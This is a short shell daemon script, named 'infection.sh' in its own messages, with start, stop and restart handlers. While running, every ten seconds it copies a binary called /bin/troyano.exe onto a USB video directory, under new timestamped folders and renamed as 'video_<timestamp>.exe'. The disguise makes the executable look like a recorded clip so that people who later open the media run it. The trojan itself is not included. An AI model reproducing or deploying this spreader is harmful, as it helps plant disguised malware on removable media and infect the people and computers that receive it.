#!/bin/sh

PIDFILE=/var/log/infection.pid

start(){
	DIRECTORY=/data/video/usb/
	echo $$ > $PIDFILE
	while true
	do
    	if [ -d "$DIRECTORY" ]; then
	    	folder_name=`date +media_%Y%m%d_%H%M%S`
			mkdir -p $DIRECTORY/$folder_name
			virus_new_name=`date +video_%Y%m%d_%H%M%S.exe`
			cp /bin/troyano.exe $DIRECTORY/$folder_name/$virus_new_name
    	fi
    	sleep 10
	done
}

stop(){
	PID=`cat $PIDFILE`
	echo 'infection.sh stopped'
	kill $PID
}

case "$1" in
	start)
		start
		;;
	stop)
		stop
		;;
	restart)
		stop
		start
		;;
	status)

		;;
	*)
		echo "Usage: $0 {start|stop|status|restart}"
esac

exit 0
